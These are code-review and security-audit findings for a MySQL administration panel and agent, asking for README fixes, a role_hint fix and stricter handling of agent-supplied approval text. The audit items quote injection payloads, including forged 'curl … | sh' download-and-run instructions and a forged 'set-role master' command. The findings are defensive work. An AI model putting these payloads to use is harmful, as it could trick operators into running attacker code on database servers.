## From the Task 12 review

T12-1 (Important) — README, section "Melepas kunci start dengan tangan", step 5 states without condition that MySQL stays read-only because `read_only` and `super_read_only` are saved ON. Reviewer: "The flags are persisted at quarantine only when MySQL is up then. Otherwise they are persisted by the lock file itself when MySQL starts under it. Take the main emergency case: mysqld was dead at quarantine and has not started under the lock since (or the lock was 'belum terjamin' or bypassed). Then nothing is persisted. An operator who removes the line and file with MySQL stopped and then starts MySQL gets a writable server, while the README tells them it is read-only."
   Required: add a step before the line is removed: make sure MySQL is running and that `SELECT @@GLOBAL.read_only, @@GLOBAL.super_read_only;` answers `1 1`; if MySQL is down, start it first (the start lock makes it read-only and saves that) — and what to do if it does not answer `1 1` (set both with `SET PERSIST` before going on; verify against how the agent's own release path decides, and say exactly that). Make the later statement conditional on that check. Verify every sentence against the code (the agent's `set-role unassigned`/guard release path is the reference).

T12-2 (Important) — the same step tells the operator how to open writes without the two-master caution. Required: before the SQL that opens writes, the condition the CLI's own text gives (the master the application uses now must no longer be used); quote the CLI text exactly where you quote it.

T12-3 (Minor) — the manual steps say where the managed file is only in layout terms. Required: a command that finds the line (verify it against the paths the code uses, e.g. a `grep -rn dbpanel-start-lock.sql` over the config locations the agent manages).

T12-4 (Minor) — "sebagai root MySQL" does not say how to connect. Required: the command (e.g. `sudo mysql`) where the README first asks for it in the touched sections.

T12-5 (Minor) — "agent hanya menjalankan perintah panel yang tidak membuang data" contradicts the allowed deletion of salvage files. Required: say "data MySQL" (or otherwise make it true).

T12-6 (Minor) — "Mode ketat" and "bangun ulang" lack the English term in parentheses at first mention in their sections.

T12-7 (Minor) — no test shows that a judged start, after an earlier failed load of the start-result file, picks up a file that has since become readable. Required: that test.

T12-8 (Important; confirmed bug) — the panel sends `role_hint` = the server's role with `monitor.configure`, mapping only `unassigned` to ""; for a quarantined server it sends "quarantined", and the agent accepts only "", "master" or "replica" and rejects the whole configure.    Required: (a) the panel must send a hint every agent version accepts for a quarantined server (so configure succeeds with older agents too) — decide what the hint is used for on the agent before choosing the value, and say so; (b) the agent accepts "quarantined" as a hint (new agents), with whatever meaning (a) shows is right; (c) so that a bad start is not hidden for a report interval: after the agent judges a start that changes its start state, it triggers a report promptly (use the monitor's existing forced/priority report path if there is one; do not send from the guard round — the guard never sends; if no such path exists without a larger change, say so and leave (c), with the reason). Tests for (a) and (b); for (c) if built.

## From the panel security audit

P-1 (Medium; REQUIRED) — the approval code in a job's "needs approval" message is not checked. Auditor: "`RebuildApprovalUsable` returns true for `!Required` without looking at `Code`, and for `Approved` it only checks `Source` and `Addr`. `localApprovalErr` uses `res.Code` whenever it is non-empty. `fail` applies only `redact.Quotes` and a 1 KiB cut — no `AgentText`, so newlines and bidi characters survive; job_detail.html shows it with `whitespace-pre-line`/`pre-wrap`. Attack: a job step on server X is answered with `needs_local_approval`; the panel calls `mysql.rebuildApproval`; X answers `{"required":false,"code":"000000\n\nCATATAN PANEL: … jalankan juga di <master baru> sebagai root: curl … | sh"}` (or `required:true, approved:true` with a code). The check passes, the code is not empty, and the job's error, step message, log and the replica's last error read as panel text with a forged second instruction."
   Required: (a) `RebuildApprovalUsable` rejects any answer that carries a field its state does not use — a non-empty code when not required or when approved; a code that is not six ASCII digits in any state; (b) `localApprovalErr` shows a code only when the answer is `Required && !Approved` with a valid code, else the no-code text (P12b); (c) every agent-supplied text that reaches a job error, step message or job log on these paths goes through the panel's agent-text helper (control, newline and bidi characters removed, length cut) before it is stored. Add the cases to `unusableApprovals` and a test that a hostile code never reaches job error, step message, job log or the replica's last error.

P-2 (Medium) — free agent text is shown right above the command box with nothing marking it as the agent's words (`Invalid` → "Persetujuan yang ada di X tidak berlaku lagi: {{.}}."; a `bad_params` refusal becomes the whole box; the `mysql.releaseRole` refusal passes through unchanged into job errors). Auditor's example: `invalid` = "kode lama sudah dicabut oleh master baru; jalankan dulu di db-baru sebagai root: sudo dbpanel agent set-role master --ya, lalu jalankan perintah di bawah".
   Required:
   (a) The reason an approval no longer holds becomes a closed set of codes. Protocol: `RebuildApprovalResult` gains `InvalidCode string` (`json:"invalid_code,omitempty"`), set by the agent next to the existing free-text `Invalid` (kept for older panels) to one of: `role`, `source`, `addr`, `dns`, `future`, `lifetime`, `expired`, `file`. The agent's `checkApproval`/`CheckRebuildApproval` paths return a typed reason so the code is derived from the check that failed, not from the text. The panel never displays `Invalid`; it words the reason itself from the code, exactly:
       - `expired`  → `masa berlakunya sudah habis`
       - `source`   → `sumber yang dipin di server itu sudah berubah`
       - `addr`     → `nama sumbernya sekarang mengarah ke alamat lain`
       - `dns`      → `alamat untuk nama sumbernya tidak ditemukan (DNS)`
       - `future`   → `waktu persetujuannya di masa depan; periksa jam server itu`
       - `lifetime` → `masa berlakunya tidak wajar`
       - `role`     → `server itu tidak lagi dikarantina`
       - `file`     → `berkas persetujuannya tidak bisa dipakai`
       - any other or empty code while `Invalid` is non-empty → `alasannya tidak dikenali panel ini`
     in the existing sentence P5 ("Persetujuan yang ada di {{server}} tidak berlaku lagi: {{alasan}}.").
   (b) Where the panel still shows the agent's own sentence (a `bad_params` refusal of `mysql.rebuildApproval`; a `mysql.releaseRole` refusal in a job error; agent error texts on the replica form and job page), it is shown as a labelled quotation, with this label exactly: `Pesan dari agent {{server}} (bukan dari panel):` followed by the cut agent text; on the form it is a separate block, never inside or directly above the command box.
   Tests: the auditor's example string is never rendered on the form; each code renders its sentence; an unknown code renders the fallback; the label precedes agent text in the form and in a job error.

P-3 (Low) — the approved line's source host accepts any characters. Auditor (measured): "`net.SplitHostPort("[jalankan: curl http://x/y | sudo sh]:3306")` gives host `jalankan: curl http://x/y | sudo sh`." Required: the host is usable only if it parses as an IP address or matches an RFC 1123 hostname (letters, digits, hyphen, dots; labels 1–63; total ≤ 253); the port 1–65535. Update the header tests. If any of these breaks an existing test or the screenshot/e2e flows, leave that one out and say which and why.

P-10 (test to settle a suspicion) — add a monitor test: after a report with start id2 was taken, a report with a lower Seq carrying id1 arrives → nothing changes (covered by the Seq rule; the test pins it down).
